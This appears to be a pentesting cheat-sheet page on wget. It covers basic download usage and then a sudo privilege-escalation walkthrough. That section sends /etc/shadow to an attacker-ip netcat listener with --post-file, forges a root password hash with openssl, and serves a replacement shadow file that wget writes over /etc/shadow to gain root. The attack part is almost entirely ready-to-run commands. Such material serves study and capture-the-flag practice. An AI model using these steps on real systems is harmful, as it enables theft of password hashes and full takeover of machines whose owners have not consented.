---
title: Wget
desc: Retrieve content from web servers.
tags: [Linux, PrivEsc]
alts: [Curl]
website:
render_with_liquid: false
---

## Basic Usage

```sh
wget http://example.com/example.txt

# Specify the output name
wget http://example.com/example.txt -O example1.txt

# Download directory
# -r: recursive
# -np: no parent
# Don't forget "/" after the directory name
wget -r -np http://example.com/somedir/
```

<br />

## Sudo Privilege Escalation

Get /etc/shadow and generate a new hash passwd and set it to shadow file, then upload it. That changes the root password.

```sh
# Check the current user's sudo list
sudo -l

(root) NOPASSWD: /usr/bin/wget

# ------------------------------------------------

# If it allows the user to use wget as root privilege...

# In attack machine,
nc -lvnp 4444

# -------------------------------------------------

# In target machine,
sudo /usr/bin/wget --post-file=/etc/shadow <attacker-ip> 4444

# -----------------------------------------------------

# In attack machine, copy the output text (the content of /etc/shadow) and paste a new shadow file.
vim shadow.txt

# Generate a new hash passwd for root
openssl passwd -6 -salt salt password

# Copy and paste the generated passwd to the shadow.txt
vim shadow.txt

# shadow.txt
root:$6$salt$IxDD...DCy.g.:18195:0:99999:7:::
...

# Open HTTP server...
python -m http.server

# --------------------------------------------------------------

# In target machine,
# Download the shadow.txt as /etc/shadow from the attack machine.
sudo /usr/bin/wget http://<attacker-ip>:8000/shadow.txt -O /etc/shadow 

# Then, you can swith to root user by entering the password you specified when generating hash passwd with openssl.
su root
```